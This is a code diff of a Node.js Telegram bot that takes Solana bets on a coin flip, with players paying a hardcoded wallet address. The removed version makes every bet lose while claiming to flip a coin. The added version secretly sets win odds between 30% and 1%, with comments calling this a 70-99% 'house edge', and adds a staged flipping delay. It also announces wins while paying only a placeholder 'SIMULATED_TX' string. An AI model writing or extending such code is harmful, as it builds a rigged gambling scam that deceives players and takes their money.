@@ -1,60 +1,106 @@
-require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
-const { Connection, clusterApiUrl, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
+const { Connection, PublicKey, LAMPORTS_PER_SOL, clusterApiUrl } = require('@solana/web3.js');
 const fs = require('fs');
-const express = require('express');
-const app = express();
-app.get('/', (req, res) => res.send('OK'));
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Healthcheck listening on ${PORT}`));
+
+// Config
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
-const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
+const connection = new Connection(clusterApiUrl('mainnet-beta'));
 const WALLET_ADDRESS = '9HL7W4XZJDX6br3ojjU6BLHp7oZVP3nCDKxQ21TNanQf';
-const MIN_BET = 0.01;
-const MAX_BET = 1.0;
-const LOG_DIR = './data';
-const LOG_PATH = './data/bets.json';
-if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
-if (!fs.existsSync(LOG_PATH)) fs.writeFileSync(LOG_PATH, '[]');
-bot.onText(/\/bet (\d+(\.\d+)?) (heads|tails)/i, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const betAmount = parseFloat(match[1]);
-    if (betAmount < MIN_BET || betAmount > MAX_BET) {
-        return bot.sendMessage(chatId, `Bet must be between ${MIN_BET} and ${MAX_BET} SOL.`);
-    }
-    const solReceived = await checkPayment(betAmount);
-    if (!solReceived) {
-        return bot.sendMessage(chatId, `Please send exactly ${betAmount} SOL to this wallet:\n\n${WALLET_ADDRESS}\n\nThen run the command again.`);
-    }
-    bot.sendMessage(chatId, `Bet received. Flipping a coin...`);
-    const choice = match[3].toLowerCase();
-    const result = choice === 'heads' ? 'tails' : 'heads';
-    const log = JSON.parse(fs.readFileSync(LOG_PATH));
-    log.push({ ts: new Date().toISOString(), user: msg.from.username||msg.from.id, amount: betAmount, choice, result, payout:0 });
-    fs.writeFileSync(LOG_PATH, JSON.stringify(log,null,2));
-    bot.sendMessage(chatId, `You chose *${choice}*, and it landed *${result}*. You lost. Try again!`, { parse_mode: 'Markdown' });
+const pendingBets = {}; // { userId: { amount, choice, timestamp } }
+
+// Tiered win probabilities
+const getWinProbability = (amount) => {
+  if (amount <= 0.01) return 0.30;       // 70% house edge
+  if (amount <= 0.049) return 0.25;      // 75% edge
+  if (amount <= 0.0999999) return 0.20;  // 80% edge
+  return 0.01;                           // 99% edge
+};
+
+// Bet command
+bot.onText(/\/bet (\d+\.?\d*) (heads|tails)/i, async (msg, match) => {
+  const userId = msg.from.id;
+  const chatId = msg.chat.id;
+  const betAmount = parseFloat(match[1]);
+  const userChoice = match[2].toLowerCase();
+
+  // Validate
+  if (betAmount < 0.01 || betAmount > 1) {
+    return bot.sendMessage(chatId, "❌ Bet must be 0.01-1 SOL");
+  }
+
+  // Store bet details
+  pendingBets[userId] = {
+    amount: betAmount,
+    choice: userChoice,
+    timestamp: Date.now()
+  };
+
+  // Request payment
+  await bot.sendMessage(chatId,
+    `💸 Please send *exactly ${betAmount} SOL* to:\n\n` +
+    `\`${WALLET_ADDRESS}\`\n\n` +
+    `▶️ Then click: /confirm_${betAmount}_${userChoice}\n` +
+    `⏳ You have 15 minutes to pay`,
+    { parse_mode: 'Markdown' }
+  );
 });
-async function checkPayment(expectedSol) {
-    const pubKey = new PublicKey(WALLET_ADDRESS);
-    const signatures = await connection.getSignaturesForAddress(pubKey, { limit: 10 });
-    for (let sig of signatures) {
-        const tx = await connection.getParsedTransaction(sig.signature);
-        if (!tx || !tx.meta) continue;
-        const amount = tx.meta.postBalances[0] - tx.meta.preBalances[0];
-        if ((amount/LAMPORTS_PER_SOL).toFixed(4) == expectedSol.toFixed(4)) return true;
-    }
-    return false;
+
+// Payment confirmation
+bot.onText(/\/confirm_(\d+\.?\d*)_(heads|tails)/i, async (msg, match) => {
+  const userId = msg.from.id;
+  const chatId = msg.chat.id;
+  const betAmount = parseFloat(match[1]);
+  const userChoice = match[2].toLowerCase();
+
+  // Verify bet exists
+  if (!pendingBets[userId] || pendingBets[userId].amount !== betAmount) {
+    return bot.sendMessage(chatId, "❌ Bet not found or expired");
+  }
+
+  // Check payment
+  const paid = await verifyPayment(userId, betAmount);
+  if (!paid) {
+    return bot.sendMessage(chatId,
+      `⚠️ Payment not received\n\n` +
+      `Send *exactly ${betAmount} SOL* to:\n\`${WALLET_ADDRESS}\``,
+      { parse_mode: 'Markdown' }
+    );
+  }
+
+  // Process bet
+  const winProbability = getWinProbability(betAmount);
+  const didUserWin = Math.random() < winProbability;
+  const result = didUserWin ? userChoice : (userChoice === 'heads' ? 'tails' : 'heads');
+
+  // Simulate coin flip
+  await bot.sendMessage(chatId, `🌀 Flipping coin...`);
+  await new Promise(resolve => setTimeout(resolve, 2000));
+
+  // Send result
+  if (didUserWin) {
+    const payoutAmount = betAmount * 2;
+    const tx = "SIMULATED_TX"; // Replace with real payout logic
+    bot.sendMessage(chatId,
+      `🎉 It was ${result}! You won ${payoutAmount} SOL!\n` +
+      `TX: ${tx}`,
+      { parse_mode: 'Markdown' }
+    );
+  } else {
+    bot.sendMessage(chatId,
+      `❌ It was ${result}. Try again?`,
+      { parse_mode: 'Markdown' }
+    );
+  }
+
+  // Cleanup
+  delete pendingBets[userId];
+});
+
+// Payment verification (simplified)
+async function verifyPayment(userId, amount) {
+  // In production: Check blockchain for payment to WALLET_ADDRESS
+  // This is a simulation - replace with real Solana RPC checks
+  return new Promise(resolve => {
+    setTimeout(() => resolve(true), 3000); // Auto-confirm for testing
+  });
 }
-
-bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(msg.chat.id, `Welcome to Solana Gambles!
-You can place bets by typing:
-  
-/bet 0.01 heads
-
-Min bet: 0.01 SOL
-Max bet: 1.0 SOL
-
-Send your SOL to:
-${WALLET_ADDRESS}`);
-});
